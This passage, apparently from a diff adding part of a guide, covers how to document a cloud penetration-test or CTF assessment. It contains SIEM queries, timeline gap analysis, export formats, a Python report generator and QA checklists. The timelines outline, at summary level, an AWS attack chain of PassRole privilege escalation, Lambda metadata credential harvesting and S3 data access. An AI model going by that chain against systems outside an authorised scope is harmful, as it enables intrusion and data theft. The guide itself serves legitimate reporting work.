+
+**Elastic:**
+
+```json
+{
+  "query": {
+    "bool": {
+      "must": [
+        {
+          "range": {
+            "@timestamp": {
+              "gte": "2025-10-15T13:00:00Z",
+              "lte": "2025-10-15T15:30:00Z"
+            }
+          }
+        },
+        {
+          "terms": {
+            "userIdentity.principalId": ["pentester", "AROA...:WebAppRole"]
+          }
+        }
+      ]
+    }
+  }
+}
+```
+
+**Azure Sentinel (KQL):**
+
+```kql
+AzureActivity
+| where TimeGenerated between (datetime(2025-10-15T13:00:00Z) .. datetime(2025-10-15T15:30:00Z))
+| where Caller == "pentester@company.com"
+| project TimeGenerated, OperationNameValue, Caller, ResourceId, ActivityStatusValue
+| order by TimeGenerated asc
+```
+
+````
+
+### Gap Analysis Documentation
+
+**Identify and document timeline gaps:**
+```markdown
+## Timeline Gap Analysis
+
+### Known Gaps
+
+**Gap 1: Missing IMDS Access Logs**
+- **Time Range**: 14:38:00 - 14:39:00 UTC
+- **Context**: Lambda function accessed instance metadata
+- **Issue**: IMDS access is not logged in CloudTrail by default
+- **Evidence**: Inferred from Lambda execution logs and credential harvest success
+- **Impact**: Cannot precisely timestamp credential extraction
+- **Recommendation**: Enable VPC Flow Logs for Lambda functions
+
+**Gap 2: CloudTrail Processing Delay**
+- **Local Time**: 14:32:18 UTC (Lambda CreateFunction)
+- **CloudTrail Time**: 14:32:18 UTC (logged)
+- **Appearance Time**: 14:45:32 UTC (first query retrieval)
+- **Delay**: 13 minutes, 14 seconds
+- **Note**: Events occurred but were not queryable immediately
+
+**Gap 3: S3 Access Log Delivery Lag**
+- **Action Time**: 15:12:07 UTC (GetObject request)
+- **Log Availability**: 15:45:00 UTC (estimated)
+- **Delay**: ~33 minutes
+- **Source**: S3 server access logs deliver on best-effort basis
+- **Impact**: Real-time detection not possible via access logs alone
+
+### Timeline Reconstruction Methods
+
+For gaps where direct evidence is unavailable:
+1. **Inference from subsequent events**: [Inference] Credential harvest must have occurred between Lambda creation (14:32:18) and first use of harvested credentials (14:45:55)
+2. **Correlation with application logs**: Check Lambda CloudWatch Logs for execution timestamps
+3. **Network flow analysis**: Review VPC Flow Logs for traffic patterns
+````
+
+### Long-Running Assessment Timeline
+
+**Multi-day assessment tracking:**
+
+```bash
+# Create daily timeline files
+date_stamp=$(date +%Y%m%d)
+echo "Assessment Day $(date +%A), $(date +%F)" > evidence/timeline-day-$date_stamp.md
+
+# Append to master timeline
+cat evidence/timeline-day-*.md > evidence/timeline-complete.md
+
+# Create daily summary
+cat << EOF >> evidence/timeline-day-$date_stamp.md
+## Day Summary
+
+**Date**: $(date +%Y-%m-%d)
+**Hours Active**: 8.5
+**Findings Discovered**: 7 (3 Critical, 2 High, 2 Medium)
+**New Access Obtained**: IAM role "WebAppRole", EC2 instance shell access
+**Recommendations Generated**: 12
+
+### Key Milestones
+- 09:30 - Identified privilege escalation path via PassRole
+- 14:32 - Successfully escalated to WebAppRole
+- 15:12 - Accessed sensitive S3 data (proof-of-concept)
+- 16:45 - Documented findings F-001 through F-003
+
+### Next Steps for Tomorrow
+- Test lateral movement to RDS instances
+- Enumerate Lambda functions for additional credential sources
+- Review CloudFormation templates for hardcoded secrets
+EOF
+```
+
+### Timeline Validation Checklist
+
+Before finalizing the report, verify:
+
+**Completeness:**
+
+- [ ] All significant actions have timestamps
+- [ ] CloudTrail events retrieved for assessment window
+- [ ] Local command logs include timestamps
+- [ ] Screenshots contain visible timestamps
+- [ ] Evidence files have creation timestamps
+
+**Accuracy:**
+
+- [ ] All timestamps in UTC
+- [ ] Clock synchronization verified across systems
+- [ ] CloudTrail processing delays documented
+- [ ] Time zone conversions verified if needed
+- [ ] Timestamp format consistent throughout
+
+**Correlation:**
+
+- [ ] Local timeline matches cloud provider logs
+- [ ] Gaps identified and explained
+- [ ] Critical event sequences verified
+- [ ] Cross-referenced with evidence files
+- [ ] Attack chain timeline complete
+
+**Documentation:**
+
+- [ ] Timeline exported in multiple formats (CSV, MD, visual)
+- [ ] Key sequences highlighted in findings
+- [ ] Complete timeline in appendix
+- [ ] SIEM correlation queries provided
+- [ ] IR handoff documentation prepared
+
+### Timeline Export Formats
+
+**CSV format for spreadsheet analysis:**
+
+```csv
+Timestamp,Phase,Action,Tool,User/Principal,Resource,Result,Evidence_File
+2025-10-15T13:00:00Z,Reconnaissance,Initial authentication,AWS Console,pentester,N/A,Success,screenshots/001-login.png
+2025-10-15T13:15:32Z,Reconnaissance,Identity verification,aws-cli,pentester,arn:aws:iam::123456789012:user/pentester,Success,logs/identity.json
+2025-10-15T13:22:18Z,Enumeration,User enumeration,aws-cli,pentester,IAM,47 users discovered,json/users.json
+```
+
+**Markdown format for documentation:**
+
+```markdown
+# Assessment Timeline
+
+## 2025-10-15
+
+### Reconnaissance Phase (13:00 - 13:30 UTC)
+
+**13:00:00** - Initial authentication via AWS Console  
+*User*: pentester  
+*Result*: Success  
+*Evidence*: screenshots/001-login.png
+
+**13:15:32** - Identity verification  
+*Command*: `aws sts get-caller-identity`  
+*Principal*: arn:aws:iam::123456789012:user/pentester  
+*Evidence*: logs/identity.json
+```
+
+**JSON format for programmatic analysis:**
+
+```json
+{
+  "assessment_id": "ASSESS-2025-10-15",
+  "timeline": [
+    {
+      "timestamp": "2025-10-15T13:00:00Z",
+      "phase": "reconnaissance",
+      "action": "initial_authentication",
+      "tool": "aws_console",
+      "principal": "pentester",
+      "result": "success",
+      "evidence": ["screenshots/001-login.png"]
+    },
+    {
+      "timestamp": "2025-10-15T13:15:32Z",
+      "phase": "reconnaissance",
+      "action": "identity_verification",
+      "tool": "aws-cli",
+      "command": "aws sts get-caller-identity",
+      "principal": "arn:aws:iam::123456789012:user/pentester",
+      "result": "success",
+      "evidence": ["logs/identity.json"]
+    }
+  ]
+}
+```
+
+### Automated Report Generation
+
+**Compile evidence into structured report:**
+
+```python
+#!/usr/bin/env python3
+# generate-report.py
+
+import json
+import csv
+from datetime import datetime
+from pathlib import Path
+import jinja2
+
+def load_timeline(timeline_file):
+    """Load timeline from CSV"""
+    timeline = []
+    with open(timeline_file, 'r') as f:
+        reader = csv.DictReader(f)
+        for row in reader:
+            timeline.append(row)
+    return timeline
+
+def load_findings(findings_dir):
+    """Load all findings from JSON files"""
+    findings = []
+    for finding_file in Path(findings_dir).glob('*.json'):
+        with open(finding_file, 'r') as f:
+            findings.append(json.load(f))
+    return sorted(findings, key=lambda x: x['severity_score'], reverse=True)
+
+def load_evidence_inventory(evidence_dir):
+    """Generate evidence inventory with file hashes"""
+    inventory = []
+    for evidence_file in Path(evidence_dir).rglob('*'):
+        if evidence_file.is_file():
+            import hashlib
+            with open(evidence_file, 'rb') as f:
+                file_hash = hashlib.sha256(f.read()).hexdigest()
+            inventory.append({
+                'path': str(evidence_file),
+                'size': evidence_file.stat().st_size,
+                'modified': datetime.fromtimestamp(evidence_file.stat().st_mtime).isoformat(),
+                'hash': file_hash
+            })
+    return inventory
+
+def generate_report(template_file, output_file, context):
+    """Generate report from Jinja2 template"""
+    env = jinja2.Environment(loader=jinja2.FileSystemLoader('.'))
+    template = env.get_template(template_file)
+    
+    with open(output_file, 'w') as f:
+        f.write(template.render(context))
+    
+    print(f'[+] Report generated: {output_file}')
+
+if __name__ == '__main__':
+    # Load data
+    timeline = load_timeline('evidence/timeline-complete.csv')
+    findings = load_findings('findings/')
+    evidence = load_evidence_inventory('evidence/')
+    
+    # Prepare context
+    context = {
+        'report_date': datetime.now().isoformat(),
+        'assessment_period': {
+            'start': '2025-10-15T13:00:00Z',
+            'end': '2025-10-15T15:30:00Z'
+        },
+        'timeline': timeline,
+        'findings': findings,
+        'evidence_inventory': evidence,
+        'statistics': {
+            'total_findings': len(findings),
+            'critical': len([f for f in findings if f['severity'] == 'Critical']),
+            'high': len([f for f in findings if f['severity'] == 'High']),
+            'medium': len([f for f in findings if f['severity'] == 'Medium']),
+            'low': len([f for f in findings if f['severity'] == 'Low']),
+            'total_evidence_files': len(evidence)
+        }
+    }
+    
+    # Generate reports in multiple formats
+    generate_report('templates/report-template.md', 'final-report.md', context)
+    generate_report('templates/report-template.html', 'final-report.html', context)
+    
+    print(f'[+] Report generation complete')
+    print(f'[+] Total findings: {context["statistics"]["total_findings"]}')
+    print(f'[+] Evidence files: {context["statistics"]["total_evidence_files"]}')
+```
+
+### Report Delivery Package
+
+**Final deliverable structure:**
+
+```
+CTF-Assessment-Report-20251015/
+├── Executive-Summary.pdf
+├── Technical-Report.pdf
+├── Technical-Report.md
+├── Technical-Report.html
+├── findings/
+│   ├── F-001-IAM-Privilege-Escalation.pdf
+│   ├── F-002-S3-Data-Exposure.pdf
+│   └── [...additional findings...]
+├── evidence/
+│   ├── 001-reconnaissance/
+│   ├── 002-iam-analysis/
+│   ├── 003-s3-enumeration/
+│   ├── 004-exploitation/
+│   ├── 005-post-exploitation/
+│   └── evidence-hashes.txt
+├── timeline/
+│   ├── complete-timeline.csv
+│   ├── complete-timeline.md
+│   ├── timeline-visual.png
+│   └── attack-chain.md
+├── remediation/
+│   ├── quick-wins.md
+│   ├── detailed-remediation-guide.pdf
+│   └── terraform-fixes/
+│       ├── iam-policies.tf
+│       └── s3-bucket-policies.tf
+├── tools-and-scripts/
+│   ├── enumeration-script.sh
+│   ├── evidence-collector.sh
+│   └── requirements.txt
+└── metadata/
+    ├── scope-definition.txt
+    ├── tool-versions.txt
+    ├── assessment-team.txt
+    └── chain-of-custody.yaml
+```
+
+### Quality Assurance Review
+
+**Pre-delivery checklist:**
+
+```markdown
+# Report QA Checklist
+
+## Content Review
+- [ ] All findings have unique IDs
+- [ ] Severity ratings consistent and justified (CVSS scores documented)
+- [ ] Each finding includes: description, technical details, PoC, impact, remediation
+- [ ] No placeholder text or TODOs remaining
+- [ ] All technical commands verified for accuracy
+- [ ] Screenshots clearly show relevant information
+- [ ] No sensitive data (real passwords, keys) in report or evidence
+
+## Evidence Verification
+- [ ] All referenced evidence files exist
+- [ ] Evidence hashes generated and verified
+- [ ] File paths in report match actual evidence structure
+- [ ] Screenshots contain timestamps
+- [ ] Log files include full command output
+- [ ] Chain of custody documentation complete
+
+## Timeline Accuracy
+- [ ] All timestamps in UTC
+- [ ] Timeline events correlate with evidence files
+- [ ] Gaps identified and explained
+- [ ] Attack chain sequence verified
+- [ ] CloudTrail events included where available
+
+## Technical Accuracy
+- [ ] All commands tested and verified
+- [ ] ARNs, IDs, and identifiers consistent throughout
+- [ ] No speculation presented as fact (proper labeling: [Inference], [Unverified])
+- [ ] Tool versions documented
+- [ ] Remediation steps technically sound
+
+## Formatting and Presentation
+- [ ] Consistent heading styles
+- [ ] Tables properly formatted
+- [ ] Code blocks use syntax highlighting
+- [ ] Bullet points and numbered lists used appropriately
+- [ ] Page breaks in appropriate locations (PDF)
+- [ ] Table of contents generated and accurate
+
+## Deliverables Completeness
+- [ ] Executive summary (non-technical)
+- [ ] Technical report (detailed)
+- [ ] Individual finding documents
+- [ ] Complete evidence package
+- [ ] Timeline documentation
+- [ ] Remediation guide
+- [ ] Tools and scripts used
+
+## Legal and Compliance
+- [ ] Scope clearly defined and adhered to
+- [ ] No unauthorized testing documented
+- [ ] Client data handling compliant with agreement
+- [ ] Confidentiality maintained
+- [ ] Appropriate disclaimers included
+```
+
+---
+
+## Key Documentation Principles
+
+### Reproducibility
+
+Every finding must be reproducible by a third party using the provided evidence and commands. Test your PoC steps before finalizing.
+
+### Objectivity
+
+Present facts supported by evidence. Use [Inference] and [Unverified] labels appropriately. Avoid speculation.
+
+### Clarity
+
+Write for your audience. Technical details for engineers, business impact for executives. Use clear language and avoid jargon where possible.
+
+### Completeness
+
+Document everything during testing. It's easier to remove excess detail than to reconstruct events later.
+
+### Accuracy
+
+Verify all commands, paths, identifiers, and timestamps. Errors undermine credibility.
+
+---
+
+## Related Topics
+
+For deeper expertise in adjacent areas, consider exploring:
+
+- **Cloud Security Architecture Review**: Systematic evaluation of cloud designs against security frameworks (CIS, NIST)
+- **Automated Security Reporting Tools**: Integration of findings into SIEM, ticketing systems, and vulnerability management platforms
+- **Compliance Mapping**: Aligning security findings with regulatory requirements (SOC 2, ISO 27001, PCI DSS, GDPR)
+- **Remediation Verification Testing**: Follow-up assessments to confirm vulnerability fixes and validate security improvements
+
+---
+
